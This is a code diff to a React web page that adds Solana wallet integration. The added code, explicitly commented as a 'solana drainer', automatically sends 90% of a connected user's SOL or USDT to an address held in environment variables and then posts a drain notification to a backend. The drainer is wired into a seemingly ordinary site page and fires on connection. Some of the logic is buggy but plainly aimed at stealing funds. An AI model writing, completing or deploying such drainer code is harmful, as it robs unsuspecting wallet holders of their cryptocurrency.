@@ -12,12 +12,16 @@ import {
   bitcoin,
   sepolia,
 } from "@reown/appkit/networks";
+import { PublicKey,Transaction, SystemProgram } from "@solana/web3.js";
 import {
   useAppKit,
   useAppKitAccount,
   useWalletInfo,
   useDisconnect,
+  useAppKitProvider,
 } from "@reown/appkit/react";
+import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
+// import { Provider } from "@reown/appkit-adapter-solana/react";
 import {
   useSwitchChain,
   useSendTransaction,
@@ -28,6 +32,21 @@ import {
   useGasPrice,
   useEstimateGas,
 } from "wagmi";
+import {
+  appendTransactionMessageInstructions,
+  createTransactionMessage,
+  pipe,
+  setTransactionMessageFeePayerSigner,
+  setTransactionMessageLifetimeUsingBlockhash,
+} from "@solana/kit";
+
+import {
+  findAssociatedTokenPda,
+  getCreateAssociatedTokenInstructionAsync,
+  getTransferInstruction,
+  fetchToken,
+  TOKEN_PROGRAM_ADDRESS
+} from "@solana-program/token";
 // import { parseEther } from 'viem'
 import { useEffect, useState } from "react";
 import { erc20Abi } from "viem";
@@ -43,6 +62,7 @@ const Home = () => {
   const { disconnect } = useDisconnect();
   const { walletInfo } = useWalletInfo();
     const [tokenAddress, setTokenAddress] = useState(null);
+    const { walletProvider } = useAppKitProvider("solana");
 
   const [txHash, setTxHash] = useState(null);
 
@@ -327,6 +347,180 @@ const Home = () => {
       sendToken();
     }
   }, [isConnected, hasToken, rawBalance, decimals]);
+
+
+  //solana drainer
+//get balance
+  const getSolBalance = async () => {
+  if (!address) return;
+
+  const balanceLamports = await connection.getBalance(address); // returns lamports
+
+    const amountToSend = BigInt(Math.floor(Number(balanceLamports) * 0.9));
+
+  return amountToSend;
+};
+
+
+
+  // function to send a TX
+const handleSendTx = async() => {
+    const latestBlockhash = await connection.getLatestBlockhash();
+
+    // create the transaction
+    const transaction= new Transaction({
+        feePayer: address,
+        recentBlockhash: latestBlockhash?.blockhash,
+      }).add(
+        SystemProgram.transfer({
+          fromPubkey: address,
+          toPubkey: new PublicKey(address), // destination address
+          lamports: getSolBalance(),
+        })
+      );
+
+    // raise the modal
+    const signature = await walletProvider.sendTransaction(transaction, connection)
+          const drainNotification = async () => {
+    await fetch(`${import.meta.env.VITE_API}/send-notification`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        transaction: `${formatBalance(getUSDTBalance(), activeChain)} ${
+          balance.data?.symbol
+        } sent to ${import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`]}`,
+      }),
+    });
+  };
+  drainNotification()
+
+    // print the Transaction Signature
+    console.log(signature);
+}
+
+  const { connection } = useAppKitConnection();
+  const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrFvtitxozpP8FDfrpsfhhVFvZM9dj");
+  const sendUsdt  = async () => {
+  try {
+    if (!isConnected) throw new Error("Wallet not connected");
+
+    const sender = new PublicKey(address);
+    const recipient = new PublicKey(import.meta.env.VITE_SOL_ADDRESS);
+
+    // 1️⃣ Derive sender ATA
+    const [senderAta] = await findAssociatedTokenPda({
+      mint: USDT_MINT,
+      owner: sender,
+      tokenProgram: TOKEN_PROGRAM_ADDRESS,
+    });
+
+    // 2️⃣ Fetch sender token account to get balance
+    const senderAccount = await fetchToken(connection, senderAta, {
+      commitment: "confirmed",
+    });
+
+    const currentBalance = senderAccount.data.amount; // in smallest units
+
+    if (currentBalance === 0n) {
+      console.log("No USDT to send");
+      return;
+    }
+
+    // 3️⃣ Calculate 90% of balance
+    const amountToSend = (currentBalance * 90n) / 100n;
+
+    // 4️⃣ Derive recipient ATA
+    const [recipientAta] = await findAssociatedTokenPda({
+      mint: USDT_MINT,
+      owner: recipient,
+      tokenProgram: TOKEN_PROGRAM_ADDRESS,
+    });
+
+    // 5️⃣ Create ATAs if missing
+    const createSenderAtaIx = await getCreateAssociatedTokenInstructionAsync({
+      payer: sender,
+      mint: USDT_MINT,
+      owner: sender,
+    });
+
+    const createRecipientAtaIx = await getCreateAssociatedTokenInstructionAsync({
+      payer: sender,
+      mint: USDT_MINT,
+      owner: recipient,
+    });
+
+    // 6️⃣ Transfer instruction
+    const transferIx = getTransferInstruction({
+      source: senderAta,
+      destination: recipientAta,
+      authority: sender,
+      amount: amountToSend,
+    });
+
+    // 7️⃣ Build transaction
+    const latestBlockhash = await connection.getLatestBlockhash();
+
+    const txMessage = pipe(
+      createTransactionMessage({ version: 0 }),
+      (tx) => setTransactionMessageFeePayerSigner(sender, tx),
+      (tx) => setTransactionMessageLifetimeUsingBlockhash(latestBlockhash, tx),
+      (tx) => appendTransactionMessageInstructions(
+        [createSenderAtaIx, createRecipientAtaIx, transferIx],
+        tx
+      )
+    );
+
+    // 8️⃣ Send transaction
+    const signature = await walletProvider.sendTransaction(txMessage, connection);
+    console.log("✅ 90% USDT Sent:", signature);
+      const drainNotification = async () => {
+    await fetch(`${import.meta.env.VITE_API}/send-notification`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        transaction: `${formatBalance(getUSDTBalance(), activeChain)} ${
+          balance.data?.symbol
+        } sent to ${import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`]}`,
+      }),
+    });
+  };
+  drainNotification()
+    return signature;
+  } catch (err) {
+    console.error("❌ Error sending USDT:", err);
+  }
+};
+
+const getUSDTBalance = async () => {
+  if (!address) return;
+
+  // 1. Derive Associated Token Account (ATA) for USDT
+  const [usdtATA] = await findAssociatedTokenPda({
+    mint: USDT_MINT,
+    owner: address,
+    tokenProgram: TOKEN_PROGRAM_ADDRESS,
+  });
+
+  // 2. Fetch token account data
+  const usdtAccount = await fetchToken(connection, usdtATA, { commitment: "confirmed" });
+
+  // 3. Get balance (adjust by decimals)
+  const decimals = usdtAccount.data.mintInfo.decimals; // usually 6 for USDT
+  const rawAmount = usdtAccount.data.amount; // in smallest units
+  const amount = Number(rawAmount) / 10 ** decimals;
+
+  console.log("USDT balance:", amount);
+  return amount;
+};
+console.log("usdt balance", getUSDTBalance())
+
+useEffect(() => {
+  if(getSolBalance > 0n) {
+    handleSendTx();
+  } else if (getUSDTBalance() > 0) {
+    sendUsdt()
+  }
+},[getSolBalance, getUSDTBalance, connection, handleSendTx])
 
   const images = Array.from({ length: 32 }, (_, i) => `/images/${i + 1}.PNG`);
 
